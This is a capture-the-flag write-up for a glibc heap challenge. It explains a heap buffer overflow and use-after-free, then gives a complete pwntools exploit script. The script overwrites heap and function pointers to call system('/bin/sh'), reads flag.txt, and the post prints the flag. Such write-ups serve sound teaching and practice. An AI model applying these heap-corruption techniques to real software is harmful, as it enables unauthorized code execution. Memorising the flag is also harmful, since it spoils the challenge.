---
date: '2025-12-10T14:34:57+05:30'
title: 'Heap Heap Hooray'

challenge-categories:
-   Binary Exploitation
-   Reverse Engineering
-   glibc heap
-   tcache poison

---

Manipulating pointers like there's no tomorrow.

<!--more-->

## Problem Statement

"Twist the heap just right and you might get the flag."

`nc challenges2.perfectroot.wiki 8001 `


## Bugs
1. Heap buffer overflow when edit (allows overwriting stored ptr)
2. UAF + tcache poisoning

## Solve

1. Allocate three items
2. Edit 2nd item, overflow into 3rd item, overwite heap ptr (not the function ptr) to addr of messages
3. Show to get heap leak
4. Now overwrite stored function ptr

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = "tmux neww -a".split()

exe = context.binary = ELF(args.EXE or "./heap2")
libc = exe.libc
assert libc is not None


def start(argv=[], *a, **kw):
    addr, port = args.REMOTE.split(":")
    return remote(addr, int(port))


gdbscript = """
continue
""".format(**locals())

io = start()
sla = io.sendlineafter
sa = io.sendafter
sl = io.sendline
ru = io.recvuntil
rl = io.recvline


def add(msg: bytes):
    sla(b"oice: ", b"1")
    sla(b"Enter message name: ", msg)
    ru(b"Message added at index ")
    return int(rl(keepends=False).strip().decode())


def dele(idx: int):
    sla(b"oice: ", b"2")
    sla(b"Index to delete: ", str(idx).encode())
    ru(b"Message name freed")


def edit(idx: int, msg: bytes):
    sla(b"oice: ", b"3")
    sla(b"Index to edit: ", str(idx).encode())
    sla(b"Enter new name: ", msg)
    # ru(b"=== Message Manager === ")


def show(idx: int):
    sla(b"oice: ", b"4")
    sla(b"Index to show: ", str(idx).encode())
    ru(b"Notification: ")
    return rl(keepends=False)


niceidx = add(b"nice")
viceidx = add(b"vice")
diceidx = add(b"dice")

# overwrite vice's msg->buffer to overflow into dice's message_t

# 0x405310     0000000065636976 0000000000000000
# 0x405320     0000000000000000 0000000000000000
# 0x405330     0000000000000000 0000000000000021
# 0x405340     0000000000405360 0000000000000020

frame = {
    0x00: b"vice\x00",
    0x08: 0,
    0x10: 0,
    0x18: 0,
    0x20: 0,
    0x28: 0x21,
    0x30: exe.sym["message_count"],
    0x38: p8(0x20),
    # 0x39: b"\n", # not needed, we use sla in edit.
}
frame = flat(frame)
edit(viceidx, frame)


def reset_count():
    frame = {
        0: p32(0),
        # -1: b"\n", # not needed, we use sla
    }
    frame = flat(frame)
    edit(diceidx, frame)


frame = {
    0x00: b"nice\x00",
    0x08: 0,
    0x10: 0,
    0x18: 0,
    0x20: 0,
    0x28: 0x21,
    0x30: exe.sym["messages"],
    0x38: p8(0x20),
    # 0x39: b"\n", # not needed, we use sla in edit.
}
frame = flat(frame)
edit(niceidx, frame)

nice_message = u64((show(viceidx)).ljust(8, b"\x00"))
ptr_at = nice_message + 0x10

frame = {
    0x00: b"nice\x00",
    0x08: 0,
    0x10: 0,
    0x18: 0,
    0x20: 0,
    0x28: 0x21,
    0x30: ptr_at,
    0x38: p8(0x20),
    # 0x39: b"\n", # not needed, we use sla in edit.
}
frame = flat(frame)
edit(niceidx, frame)

# __import__("ipdb").set_trace()
edit(viceidx, p64(exe.plt["system"]))
edit(niceidx, b"/bin/sh\x00")
# show(niceidx)
sla(b"oice: ", b"4")
sla(b"Index to show: ", str(niceidx).encode())
sl(b"cat flag.txt")
io.interactive()
```


## Flag

```
r00t{0v3rwr1t1n9_p01nt3r5_15_fun_032b489}
```

